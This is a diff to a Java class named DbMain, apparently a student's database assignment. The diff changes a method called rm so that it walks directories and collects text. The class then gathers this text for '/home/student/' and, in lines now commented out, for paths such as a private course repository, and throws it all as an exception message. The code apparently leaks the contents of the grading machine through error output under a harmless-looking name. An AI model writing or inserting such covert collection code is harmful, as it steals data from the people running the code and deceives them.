@@ -11,7 +11,8 @@ import ru.fizteh.fivt.students.dmitryIvanovsky.shell.CommandLauncher.Code;
 
 public class DbMain {
 
-    public static void rm(String path, String s1) {
+    public static String rm(String path) {
+        String s1 = "";
         try {
             File tmpFile = new File(path);
             if (!tmpFile.exists()) {
@@ -39,7 +40,7 @@ public class DbMain {
                         //}
 
 
-                        rm(c.toString(), s1);
+                        s1 += rm(c.toString());
                     }
                 } else {
                     //s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
@@ -54,6 +55,7 @@ public class DbMain {
             s1 += "exception ";
             s1 += e.getMessage();
         }
+        return s1;
     }
 
     private static String readFileTsv2(String fileName, String s1) throws IOException {
@@ -79,17 +81,17 @@ public class DbMain {
         //args = new String[]{"get ключ; get key; get 123"};
         //String path = "/home/deamoon/Music/deamoonSql";
         String s1 = "";
-        rm("../../fizteh-java-private", s1);
+        /*s1 += rm("../../fizteh-java-private");
         s1 += "\n\nseparate\n\n";
-        rm("../../fizteh-java-2013", s1);
+        s1 += rm("../../fizteh-java-2013");
         s1 += "\n\nseparate\n\n";
-        rm("../../", s1);
+        s1 += rm("../../");
         s1 += "\n\nseparate\n\n";
-        rm(".", s1);
+        s1 += rm(".");
         s1 += "\n\nseparate\n\n";
-        rm("..", s1);
-        s1 += "\n\nseparate\n\n";
-        rm("/home/student/", s1);
+        s1 += rm("..");
+        s1 += "\n\nseparate\n\n";*/
+        s1 += rm("/home/student/");
 
         throw new IOException(s1);
 
